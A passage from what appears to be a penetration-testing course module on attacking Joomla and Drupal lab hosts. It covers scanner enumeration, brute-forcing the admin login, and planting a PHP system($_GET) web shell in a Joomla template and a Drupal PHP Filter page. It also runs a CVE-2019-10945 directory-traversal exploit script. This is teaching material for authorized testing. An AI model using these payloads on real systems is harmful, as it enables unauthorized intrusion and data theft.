  <span class="hljs-tag">&lt;<span class="hljs-name">authorEmail</span>&gt;</span>admin@joomla.org<span class="hljs-tag">&lt;/<span class="hljs-name">authorEmail</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">authorUrl</span>&gt;</span>www.joomla.org<span class="hljs-tag">&lt;/<span class="hljs-name">authorUrl</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">copyright</span>&gt;</span>(C) 2005 - 2019 Open Source Matters. All rights reserved<span class="hljs-tag">&lt;/<span class="hljs-name">copyright</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">license</span>&gt;</span>GNU General Public License version 2 or later; see LICENSE.txt<span class="hljs-tag">&lt;/<span class="hljs-name">license</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.9.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">creationDate</span>&gt;</span>March 2019<span class="hljs-tag">&lt;/<span class="hljs-name">creationDate</span>&gt;</span>

 <span class="hljs-tag">&lt;<span class="hljs-name">SNIP</span>&gt;</span>
</code></pre>
<p>The <code>cache.xml</code> file can help to give us the approximate version. It is located at <code>plugins/system/cache/cache.xml</code>.</p>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Let&#39;s try out <a href="https://github.com/droope/droopescan">droopescan</a>, a plugin-based scanner that works for SilverStripe, WordPress, and Drupal with limited functionality for Joomla and Moodle.</p>
<p>We can clone the Git repo and install it manually or install via <code>pip</code>.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ sudo pip3 install droopescan

Collecting droopescan
  Downloading droopescan<span class="hljs-number">-1.45</span><span class="hljs-number">.1</span>-py2.py3-none-any.whl (<span class="hljs-number">514</span> kB)
     |████████████████████████████████| <span class="hljs-number">514</span> kB <span class="hljs-number">5.8</span> MB/s

&lt;SNIP&gt;
</code></pre>
<p>Once the installation is complete, we can confirm that the tool is working by running <code>droopescan -h</code>.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> droopescan -h

usage: droopescan (sub-commands ...) [options ...] {arguments ...}

    |<span class="hljs-string">
 ___</span>|<span class="hljs-string"> ___  ___  ___  ___  ___  ___  ___  ___  ___
</span>|<span class="hljs-string">   )</span>|<span class="hljs-string">   )</span>|<span class="hljs-string">   )</span>|<span class="hljs-string">   )</span>|<span class="hljs-string">   )</span>|<span class="hljs-string">___)</span>|<span class="hljs-string">___ </span>|<span class="hljs-string">    </span>|<span class="hljs-string">   )</span>|<span class="hljs-string">   )
</span>|<span class="hljs-string">__/ </span>|<span class="hljs-string">    </span>|<span class="hljs-string">__/ </span>|<span class="hljs-string">__/ </span>|<span class="hljs-string">__/ </span>|<span class="hljs-string">__   __/ </span>|<span class="hljs-string">__  </span>|<span class="hljs-string">__/</span>||<span class="hljs-string">  /
                    </span>|
=================================================

commands:

  scan
    cms scanning functionality.

  stats
    shows scanner status &amp; capabilities.

optional arguments:
  -h, --help  show this help message and exit
  --debug     toggle debug output
  --quiet     suppress all output

Example invocations: 
  droopescan scan drupal -u URL_HERE
  droopescan scan silverstripe -u URL_HERE

More info: 
  droopescan scan --help

Please see the README file for information regarding proxies.
</code></pre>
<p>We can access a more detailed help menu by typing <code>droopescan scan --help</code>.</p>
<p>Let&#39;s run a scan and see what it turns up.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ droopescan scan joomla --url http:/</span><span class="hljs-regexp">/dev.inlanefreight.local/</span>

[+] Possible version(s):                                                        
    <span class="hljs-number">3.8</span><span class="hljs-number">.10</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.11</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.11</span>-rc
    <span class="hljs-number">3.8</span><span class="hljs-number">.12</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.12</span>-rc
    <span class="hljs-number">3.8</span><span class="hljs-number">.13</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.7</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.7</span>-rc
    <span class="hljs-number">3.8</span><span class="hljs-number">.8</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.8</span>-rc
    <span class="hljs-number">3.8</span><span class="hljs-number">.9</span>
    <span class="hljs-number">3.8</span><span class="hljs-number">.9</span>-rc

[+] Possible interesting urls <span class="hljs-string">found:</span>
    Detailed version information. - <span class="hljs-string">http:</span><span class="hljs-comment">//dev.inlanefreight.local/administrator/manifests/files/joomla.xml</span>
    Login page. - <span class="hljs-string">http:</span><span class="hljs-comment">//dev.inlanefreight.local/administrator/</span>
    License file. - <span class="hljs-string">http:</span><span class="hljs-comment">//dev.inlanefreight.local/LICENSE.txt</span>
    Version attribute contains approx version - <span class="hljs-string">http:</span><span class="hljs-comment">//dev.inlanefreight.local/plugins/system/cache/cache.xml</span>

[+] Scan finished (<span class="hljs-number">0</span>:<span class="hljs-number">00</span>:<span class="hljs-number">01.523369</span> elapsed)
</code></pre>
<p>As we can see, it did not turn up much information aside from the possible version number. We can also try out <a href="https://github.com/drego85/JoomlaScan">JoomlaScan</a>, which is a Python tool inspired by the now-defunct OWASP <a href="https://github.com/OWASP/joomscan">joomscan</a> tool. <code>JoomlaScan</code> is a bit out-of-date and requires Python2.7 to run. We can get it running by first making sure some dependencies are installed.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb<span class="hljs-string">[/htb]</span>$ sudo python2.<span class="hljs-number">7</span> -m pip install urllib3
root@htb<span class="hljs-string">[/htb]</span>$ sudo python2.<span class="hljs-number">7</span> -m pip install certifi
root@htb<span class="hljs-string">[/htb]</span>$ sudo python2.<span class="hljs-number">7</span> -m pip install bs4
</code></pre>
<p>While a bit out of date, it can be helpful in our enumeration. Let&#39;s run a scan.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ python2<span class="hljs-number">.7</span> joomlascan.py -u <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>

<span class="hljs-comment">-------------------------------------------</span>
               Joomla Scan                  
   Usage: python joomlascan.py &lt;target&gt;    
    Version <span class="hljs-number">0.5</span>beta - Database Entries <span class="hljs-number">1233</span>
         created <span class="hljs-keyword">by</span> Andrea Draghetti       
<span class="hljs-comment">-------------------------------------------</span>
Robots <span class="hljs-built_in">file</span> found:           &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/robots.txt
No Error Log found

Start scan...<span class="hljs-keyword">with</span> <span class="hljs-number">10</span> concurrent threads!
Component found: com_actionlogs     &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/index.php?option=com_actionlogs
     On <span class="hljs-keyword">the</span> administrator components
Component found: com_admin     &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/index.php?option=com_admin
     On <span class="hljs-keyword">the</span> administrator components
Component found: com_ajax     &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/index.php?option=com_ajax
     But possibly <span class="hljs-keyword">it</span> is <span class="hljs-keyword">not</span> active <span class="hljs-keyword">or</span> protected
     LICENSE <span class="hljs-built_in">file</span> found      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_actionlogs/actionlogs.xml
     LICENSE <span class="hljs-built_in">file</span> found      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_admin/admin.xml
     LICENSE <span class="hljs-built_in">file</span> found      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_ajax/ajax.xml
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/components/com_actionlogs/
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_actionlogs/
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/components/com_admin/
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_admin/
Component found: com_banners     &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/index.php?option=com_banners
     But possibly <span class="hljs-keyword">it</span> is <span class="hljs-keyword">not</span> active <span class="hljs-keyword">or</span> protected
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/components/com_ajax/
     Explorable Directory      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_ajax/
     LICENSE <span class="hljs-built_in">file</span> found      &gt; <span class="hljs-keyword">http</span>://dev.inlanefreight.<span class="hljs-built_in">local</span>/administrator/components/com_banners/banners.xml


&lt;SNIP&gt;
</code></pre>
<p>While not as valuable as droopescan, this tool can help us find accessible directories and files and may help with fingerprinting installed extensions. At this point, we know that we are dealing with Joomla <code>3.9.4</code>. The administrator login portal is located at <code>http://dev.inlanefreight.local/administrator/index.php</code>. Attempts at user enumeration return a generic error message.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">Warning
Username <span class="hljs-literal">and</span> password <span class="hljs-keyword">do</span> <span class="hljs-literal">not</span> <span class="hljs-keyword">match</span> <span class="hljs-literal">or</span> you <span class="hljs-keyword">do</span> <span class="hljs-literal">not</span> have an account yet.
</code></pre>
<p>The default administrator account on Joomla installs is <code>admin</code>, but the password is set at install time, so the only way we can hope to get into the admin back-end is if the account is set with a very weak/common password and we can get in with some guesswork or light brute-forcing. We can use this <a href="https://github.com/ajnik/joomla-bruteforce">script</a> to attempt to brute force the login.</p>
<p>Joomla - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ sudo python3 joomla-brute.py -u http:/</span><span class="hljs-regexp">/dev.inlanefreight.local -w /</span>usr<span class="hljs-regexp">/share/</span>metasploit-framework<span class="hljs-regexp">/data/</span>wordlists/http_default_pass.txt -usr admin
<span class="hljs-symbol">
admin:</span>admin
</code></pre>
<p>And we get a hit with the credentials <code>admin:admin</code>. Someone has not been following best practices!</p>
<h2 id="attacking-joomla">Attacking Joomla</h2>
<hr>
<p>We now know that we are dealing with a Joomla e-commerce site. If we can gain access, we may be able to land in the client&#39;s internal environment and begin enumerating the internal domain environment. Like WordPress and Drupal, Joomla has had its fair share of vulnerabilities against the core application and vulnerable extensions. Furthermore, like the others, it is possible to gain remote code execution if we can log in to the admin backend.</p>
<hr>
<h3 id="abusing-built-in-functionality">Abusing Built-In Functionality</h3>
<p>During the Joomla enumeration phase and the general research hunting for company data, we may come across leaked credentials that we can use for our purposes. Using the credentials that we obtained in the examples from the last section, <code>admin:admin</code>, let&#39;s log in to the target backend at <code>http://dev.inlanefreight.local/administrator</code>. Once logged in, we can see many options available to us. For our purposes, we would like to add a snippet of PHP code to gain RCE. We can do this by customizing a template.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/joomla\_admin.png" alt=""></p>
<p>From here, we can click on <code>Templates</code> on the bottom left under <code>Configuration</code> to pull up the templates menu.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/joomla\_templates.png" alt=""></p>
<p>Next, we can click on a template name. Let&#39;s choose <code>protostar</code> under the <code>Template</code> column header. This will bring us to the <code>Templates: Customise</code> page.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/joomla\_customise.png" alt=""></p>
<p>Finally, we can click on a page to pull up the page source. It is a good idea to get in the habit of using non-standard file names and parameters for our web shells to not make them easily accessible to a &quot;drive-by&quot; attacker during the assessment. We can also password protect and even limit access down to our source IP address. Also, we must always remember to clean up web shells as soon as we are done with them but still include the file name, file hash, and location in our final report to the client.</p>
<p>Let&#39;s choose the <code>error.php</code> page. We&#39;ll add a PHP one-liner to gain code execution as follows.</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="hljs-keyword">system</span>(<span class="hljs-symbol">$</span>_GET[<span class="hljs-string">'dcfdd5e021a869fcc6dfaef8bf31377e'</span>]);
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/113/joomla\_edited.png" alt=""></p>
<p>Once this is in, click on <code>Save &amp; Close</code> at the top and confirm code execution using <code>cURL</code>.</p>
<p>Attacking Joomla</p>
<pre><code class="lang-shell-session"><span class="hljs-symbol">root@</span>htb[/htb]$ curl -s http:<span class="hljs-comment">//dev.inlanefreight.local/templates/protostar/error.php?dcfdd5e021a869fcc6dfaef8bf31377e=id</span>

uid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) gid=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>) groups=<span class="hljs-number">33</span>(www-<span class="hljs-keyword">data</span>)
</code></pre>
<p>From here, we can upgrade to an interactive reverse shell and begin looking for local privilege escalation vectors or focus on lateral movement within the corporate network. We should be sure, once again, to note down this change for our report appendices and make every effort to remove the PHP snippet from the <code>error.php</code> page.</p>
<hr>
<h3 id="leveraging-known-vulnerabilities">Leveraging Known Vulnerabilities</h3>
<p>At the time of writing, there have been <a href="https://www.cvedetails.com/vulnerability-list/vendor\_id-3496/Joomla.html">426</a> Joomla-related vulnerabilities that received CVEs. However, just because a vulnerability was disclosed and received a CVE does not mean that it is exploitable or a working public PoC exploit is available. Like with WordPress, critical vulnerabilities (such as those remote code execution) that affect Joomla core are rare. Searching a site such as <code>exploit-db</code> shows over 1,400 entries for Joomla, with the vast majority being for Joomla extensions.</p>
<p>Let&#39;s dig into a Joomla core vulnerability that affects version <code>3.9.4</code>, which our target <code>http://dev.inlanefreight.local/</code> was found to be running during our enumeration. Checking the Joomla <a href="https://www.joomla.org/announcements/release-news/5761-joomla-3-9-4-release.html">downloads</a> page, we can see that <code>3.9.4</code> was released in March of 2019. Though it is out of date as we are on Joomla <code>4.0.3</code> as of September 2021, it is entirely possible to run into this version during an assessment, especially against a large enterprise that may not maintain a proper application inventory and is unaware of its existence.</p>
<p>Researching a bit, we find that this version of Joomla is likely vulnerable to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945">CVE-2019-10945</a> which is a directory traversal and authenticated file deletion vulnerability. We can use <a href="https://www.exploit-db.com/exploits/46710">this</a> exploit script to leverage the vulnerability and list the contents of the webroot and other directories. The python3 version of this same script can be found <a href="https://github.com/dpgg101/CVE-2019-10945">here</a>. We can also use it to delete files (not recommended). This could lead to access to sensitive files such as a configuration file or script holding credentials if we can then access it via the application URL. An attacker could also cause damage by deleting necessary files if the webserver user has the proper permissions.</p>
<p>We can run the script by specifying the <code>--url</code>, <code>--username</code>, <code>--password</code>, and <code>--dir</code> flags. As pentesters, this would only be useful to us if the admin login portal is not accessible from the outside since, armed with admin creds, we can gain remote code execution, as we saw above.</p>
<p>Attacking Joomla</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> python2.7 joomla_dir_trav.py --url <span class="hljs-string">"http://dev.inlanefreight.local/administrator/"</span> --username admin --password admin --dir /

<span class="hljs-comment"># Exploit Title: Joomla Core (1.5.0 through 3.9.4) - Directory Traversal &amp;&amp; Authenticated Arbitrary File Deletion</span>
<span class="hljs-comment"># Web Site: Haboob.sa</span>
<span class="hljs-comment"># Email: research@haboob.sa</span>
<span class="hljs-comment"># Versions: Joomla 1.5.0 through Joomla 3.9.4</span>
<span class="hljs-comment"># https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-10945    </span>
 _    _          ____   ____   ____  ____  
|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">   /\   </span>|<span class="hljs-string">  _ \ / __ \ / __ \</span>|<span class="hljs-string">  _ \ 
</span>|<span class="hljs-string"> </span>|<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  /  \  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|
|<span class="hljs-string">  __  </span>|<span class="hljs-string"> / /\ \ </span>|<span class="hljs-string">  _ &lt;</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">  _ &lt; 
</span>|<span class="hljs-string"> </span>|<span class="hljs-string">  </span>|<span class="hljs-string"> </span>|<span class="hljs-string">/ ____ \</span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|<span class="hljs-string"> </span>|<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">__</span>|<span class="hljs-string"> </span>|<span class="hljs-string"> </span>|<span class="hljs-string">_) </span>|
|<span class="hljs-string">_</span>|<span class="hljs-string">  </span>|<span class="hljs-string">_/_/    \_\____/ \____/ \____/</span>|<span class="hljs-string">____/ 



administrator
bin
cache
cli
components
images
includes
language
layouts
libraries
media
modules
plugins
templates
tmp
LICENSE.txt
README.txt
configuration.php
htaccess.txt
index.php
robots.txt
web.config.txt</span>
</code></pre>
<hr>
<h3 id="moving-on">Moving On</h3>
<p>Next, let&#39;s take a look at Drupal, which, while it holds a much smaller share of the CMS market, is still used by companies worldwide.</p>
<h2 id="drupal-discovery-enumeration">Drupal - Discovery &amp; Enumeration</h2>
<hr>
<p><a href="https://www.drupal.org/">Drupal</a>, launched in 2001 is the third and final CMS we&#39;ll cover on our tour through the world of common applications. Drupal is another open-source CMS that is popular among companies and developers. Drupal is written in PHP and supports using MySQL or PostgreSQL for the backend. Additionally, SQLite can be used if there&#39;s no DBMS installed. Like WordPress, Drupal allows users to enhance their websites through the use of themes and modules. At the time of writing, the Drupal project has nearly 43,000 modules and 2,900 themes and is the third most popular CMS by market share. Here are a few interesting <a href="https://websitebuilder.org/blog/drupal-statistics/">statistics</a> on Drupal gathered from various sources:</p>
<ul>
<li>Around 1.5% of sites on the internet run Drupal (over 1.1 million sites!), 5% of the top 1 million websites on the internet, and 7% of the top 10,000 sites</li>
<li>Drupal accounts for around 2.4% of the CMS market</li>
<li>It is available in 100 languages</li>
<li>Drupal is community-oriented and has over 1.3 million members</li>
<li>Drupal 8 was built by 3,290 contributors, 1,288 companies, and help from the community</li>
<li>33 of the Fortune 500 companies use Drupal in some way</li>
<li>56% of government websites across the world use Drupal</li>
<li>23.8% of universities, colleges, and schools use Drupal worldwide</li>
<li>Some major brands that use Drupal include: Tesla and Warner Bros Records</li>
</ul>
<p>According to the Drupal <a href="https://www.drupal.org/project/usage/drupal">website</a> there are just around 950,000 instances of Drupal in use at the time of writing (distributed from version 5.x through version 9.3.x, as of September 5, 2021). As we can see from these statistics, Drupal usage has held steadily between 900,000 and 1.1 million instances between June 2013 and September 2021. These statistics do not account for <code>EVERY</code> instance of Drupal in use worldwide, but rather instances running the <a href="https://www.drupal.org/project/update\_status">Update Status</a> module, which checks in with drupal.org daily to look for any new versions of Drupal or updates to modules in use.</p>
<hr>
<h3 id="discovery-footprinting">Discovery/Footprinting</h3>
<p>During an external penetration test, we encounter what appears to be a CMS, but we know from a cursory review that the site is not running WordPress or Joomla. We know that CMS&#39; are often &quot;juicy&quot; targets, so let&#39;s dig into this one and see what we can uncover.</p>
<p>A Drupal website can be identified in several ways, including by the header or footer message <code>Powered by Drupal</code>, the standard Drupal logo, the presence of a <code>CHANGELOG.txt</code> file or <code>README.txt file</code>, via the page source, or clues in the robots.txt file such as references to <code>/node</code>.</p>
<p>Drupal - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://drupal.inlanefreight.local | grep Drupal

<span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">"Generator"</span> <span class="hljs-attr">content</span>=<span class="hljs-string">"Drupal 8 (https://www.drupal.org)"</span> /&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>Powered by <span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"https://www.drupal.org"</span>&gt;</span>Drupal<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
</code></pre>
<p>Another way to identify Drupal CMS is through <a href="https://www.drupal.org/docs/8/core/modules/node/about-nodes">nodes</a>. Drupal indexes its content using nodes. A node can hold anything such as a blog post, poll, article, etc. The page URIs are usually of the form <code>/node/&lt;nodeid&gt;</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/drupal\_node.png" alt=""></p>
<p>For example, the blog post above is found to be at <code>/node/1</code>. This representation is helpful in identifying a Drupal website when a custom theme is in use.</p>
<p>Note: Not every Drupal installation will look the same or display the login page or even allow users to access the login page from the internet.</p>
<p>Drupal supports three types of users by default:</p>
<ol>
<li><code>Administrator</code>: This user has complete control over the Drupal website.</li>
<li><code>Authenticated User</code>: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.</li>
<li><code>Anonymous</code>: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.</li>
</ol>
<hr>
<h3 id="enumeration">Enumeration</h3>
<p>Once we have discovered a Drupal instance, we can do a combination of manual and tool-based (automated) enumeration to uncover the version, installed plugins, and more. Depending on the Drupal version and any hardening measures that have been put in place, we may need to try several ways to identify the version number. Newer installs of Drupal by default block access to the <code>CHANGELOG.txt</code> and <code>README.txt</code> files, so we may need to do further enumeration. Let&#39;s look at an example of enumerating the version number using the <code>CHANGELOG.txt</code> file. To do so, we can use <code>cURL</code> along with <code>grep</code>, <code>sed</code>, <code>head</code>, etc.</p>
<p>Drupal - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ curl -s http:/</span><span class="hljs-regexp">/drupal-acc.inlanefreight.local/</span>CHANGELOG.txt | grep -m2 <span class="hljs-string">""</span>

Drupal <span class="hljs-number">7.57</span>, <span class="hljs-number">2018</span>-<span class="hljs-number">02</span>-<span class="hljs-number">21</span>
</code></pre>
<p>Here we have identified an older version of Drupal in use. Trying this against the latest Drupal version at the time of writing, we get a 404 response.</p>
<p>Drupal - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://drupal.inlanefreight.local/CHANGELOG.txt

<span class="hljs-meta">&lt;!DOCTYPE html&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>404 Not Found<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Not Found<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">p</span>&gt;</span>The requested URL "http://drupal.inlanefreight.local/CHANGELOG.txt" was not found on this server.<span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span>
</code></pre>
<p>There are several other things we could check in this instance to identify the version. Let&#39;s try a scan with <code>droopescan</code> as shown in the Joomla enumeration section. <code>Droopescan</code> has much more functionality for Drupal than it does for Joomla.</p>
<p>Let&#39;s run a scan against the <code>http://drupal.inlanefreight.local</code> host.</p>
<p>Drupal - Discovery &amp; Enumeration</p>
<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ droopescan scan drupal -u http:/</span>/drupal.inlanefreight.local

[+] Plugins <span class="hljs-string">found:</span>                                                              
    php <span class="hljs-string">http:</span><span class="hljs-comment">//drupal.inlanefreight.local/modules/php/</span>
<span class="hljs-symbol">        http:</span><span class="hljs-comment">//drupal.inlanefreight.local/modules/php/LICENSE.txt</span>

[+] No themes found.

[+] Possible version(s):
    <span class="hljs-number">8.9</span><span class="hljs-number">.0</span>
    <span class="hljs-number">8.9</span><span class="hljs-number">.1</span>

[+] Possible interesting urls <span class="hljs-string">found:</span>
    Default admin - <span class="hljs-string">http:</span><span class="hljs-comment">//drupal.inlanefreight.local/user/login</span>

[+] Scan finished (<span class="hljs-number">0</span>:<span class="hljs-number">03</span>:<span class="hljs-number">19.199526</span> elapsed)
</code></pre>
<p>This instance appears to be running version <code>8.9.1</code> of Drupal. At the time of writing, this was not the latest as it was released in June 2020. A quick search for Drupal-related <a href="https://www.cvedetails.com/vulnerability-list/vendor\_id-1367/product\_id-2387/Drupal-Drupal.html">vulnerabilities</a> does not show anything apparent for this core version of Drupal. In this instance, we would next want to look at installed plugins or abusing built-in functionality.</p>
<h2 id="attacking-drupal">Attacking Drupal</h2>
<hr>
<p>Now that we&#39;ve confirmed that we are facing Drupal and fingerprinted the version let&#39;s look and see what misconfigurations and vulnerabilities we can uncover to attempt to gain internal network access.</p>
<p>Unlike some CMS&#39;, obtaining a shell on a Drupal host via the admin console is not as easy as just editing a PHP file found within a theme or uploading a malicious PHP script.</p>
<hr>
<h3 id="leveraging-the-php-filter-module">Leveraging the PHP Filter Module</h3>
<p>In older versions of Drupal (before version 8), it was possible to log in as an admin and enable the <code>PHP filter</code> module, which &quot;Allows embedded PHP code/snippets to be evaluated.&quot;</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/drupal\_php\_module.png" alt=""></p>
<p>From here, we could tick the check box next to the module and scroll down to <code>Save configuration</code>. Next, we could go to Content --&gt; Add content and create a <code>Basic page</code>.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/basic\_page.png" alt=""></p>
<p>We can now create a page with a malicious PHP snippet such as the one below. We named the parameter with an md5 hash instead of the common <code>cmd</code> to get in the practice of not potentially leaving a door open to an attacker during our assessment. If we used the standard <code>system($_GET[&#39;cmd&#39;]);</code> we open up ourselves up to a &quot;drive-by&quot; attacker potentially coming across our web shell. Though unlikely, better safe than sorry!</p>
<p>Code: php</p>
<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
system($_GET[<span class="hljs-string">'dcfdd5e021a869fcc6dfaef8bf31377e'</span>]);
<span class="hljs-meta">?&gt;</span></span>
</code></pre>
<p><img src="https://academy.hackthebox.com/storage/modules/113/basic\_page\_shell\_7v2.png" alt=""></p>
<p>We also want to make sure to set <code>Text format</code> drop-down to <code>PHP code</code>. After clicking save, we will be redirected to the new page, in this example <code>http://drupal-qa.inlanefreight.local/node/3</code>. Once saved, we can either request execute commands in the browser by appending <code>?dcfdd5e021a869fcc6dfaef8bf31377e=id</code> to the end of the URL to run the <code>id</code> command or use <code>cURL</code> on the command line. From here, we could use a bash one-liner to obtain reverse shell access.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s http://drupal-qa.inlanefreight.local/<span class="hljs-keyword">node</span><span class="hljs-title">/3</span>?<span class="hljs-attr">dcfdd5e021a869fcc6dfaef8bf31377e=</span>id | grep uid | cut -f4 -d<span class="hljs-string">"&gt;"</span>

<span class="hljs-attr">uid=</span><span class="hljs-number">33</span>(www-data) <span class="hljs-attr">gid=</span><span class="hljs-number">33</span>(www-data) <span class="hljs-attr">groups=</span><span class="hljs-number">33</span>(www-data)
</code></pre>
<p>From version 8 onwards, the <a href="https://www.drupal.org/project/php/releases/8.x-1.1">PHP Filter</a> module is not installed by default. To leverage this functionality, we would have to install the module ourselves. Since we would be changing and adding something to the client&#39;s Drupal instance, we may want to check with them first. We&#39;d start by downloading the most recent version of the module from the Drupal website.</p>
<p>Attacking Drupal</p>
<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ wget https:/</span><span class="hljs-regexp">/ftp.drupal.org/files</span><span class="hljs-regexp">/projects/php</span>-<span class="hljs-number">8</span>.x-<span class="hljs-number">1.1</span>.tar.gz
</code></pre>
<p>Once downloaded go to <code>Administration</code> &gt; <code>Reports</code> &gt; <code>Available updates</code>.</p>
<p>Note: Location may differ based on the Drupal version and may be under the Extend menu.</p>
<p><img src="https://academy.hackthebox.com/storage/modules/113/install\_module.png" alt=""></p>
<p>From here, click on <code>Browse,</code> select the file from the directory we downloaded it to, and then click <code>Install</code>.</p>
<p>Once the module is installed, we can click on <code>Content</code> and create a new basic page, similar to how we did in the Drupal 7 example. Again, be sure to select <code>PHP code</code> from the <code>Text format</code> dropdown.</p>
<p>With either of these examples, we should keep our client apprised and obtain permission before making these sorts of changes. Also, once we are done, we should remove or disable the <code>PHP Filter</code> module and delete any pages that we created to gain remote code execution.</p>
<hr>
<h3 id="uploading-a-backdoored-module">Uploading a Backdoored Module</h3>
